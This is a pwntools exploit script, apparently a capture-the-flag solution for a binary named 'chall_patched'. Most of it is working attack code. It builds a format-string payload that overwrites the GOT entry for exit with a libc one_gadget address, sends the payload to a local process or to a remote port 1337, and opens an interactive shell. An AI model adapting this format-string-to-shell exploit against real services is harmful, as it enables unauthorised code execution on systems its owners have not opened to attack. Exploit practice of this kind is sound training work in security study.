#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")
libc.address = 0x00007ffff7dae000

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    offset = 6
    one_gadget = libc.address + 0xef52b
    payload = fmtstr_payload(offset,{exe.got['exit'] : one_gadget})
    r.sendline(payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
